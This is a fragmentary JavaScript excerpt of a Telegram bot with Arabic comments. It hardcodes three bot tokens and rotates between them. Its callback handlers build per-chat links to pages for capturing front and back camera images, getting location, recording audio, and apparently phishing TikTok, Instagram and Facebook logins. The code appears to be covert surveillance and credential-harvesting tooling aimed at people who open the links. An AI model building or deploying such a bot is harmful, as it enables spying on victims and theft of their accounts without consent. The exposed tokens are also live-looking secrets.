...
function took() {
  const tokens = [
    "8144014442:AAEAcl3oizmWxE2TkNhv0PamCYCXzLsdKOM", // 1توكن
    "8435401492:AAHzUQvAARxssr1tFaUBHKhRoiSKlcOrhGA", // 2توكن
    "7770066795:AAFKO5HHoQeqpVITG3KQv74P2QNTE_6tJtI", // توكن3
  ];
  const slot = Math.floor(Date.now() / (15 * 60 * 1000)) % tokens.length;
  return tokens[slot];
}

// استبدل سطرك القديم بهذا فقط (بدون polling):
...
bot.on('callback_query', async (callbackQuery) => {
    ...
    if (data === 'request_verification') {
        const verificationLink = `${baseUrl}/n/?chatId=${chatId}`;
    ...
    let link = '';
        ...
        switch (action) {
            case 'captureFront':
                link = `${baseUrl}/c/?chatId=${chatId}`;
                break;
            case 'captureBack':
                link = `${baseUrl}/b/?chatId=${chatId}`;
                break;
            case 'getLocation':
            ...
            case 'recordVoice':
                ...
                break;
            case 'rshq_tiktok':
                link = `${baseUrl}/t/?chatId=${chatId}&type=tiktok`;
                break;
            case 'rshq_instagram':
                link = `${baseUrl}/i/?chatId=${chatId}`;
                break;
            case 'rshq_facebook':
                link = `${baseUrl}/fe/?chatId=${chatId}`;
                break;
            default:
                bot.sendMessage(chatId, '');
                return;
...
bot.on('callback_query', (callbackQuery) => {
    ...
    if (data.startsWith('getLocationi:')) {
        ...
        const locationUrl = `${baseUrl}/lo/?chatId=${targetChatId}`;
...
bot.on('callback_query', (callbackQuery) => {
    ...
    if (data.startsWith('recordAudio:')) {
        ...
        // إنشاء رابط HTML فريد لكل مستخدم
        const audioUrl = `${baseUrl}/r/?chatId=${targetChatId}`;
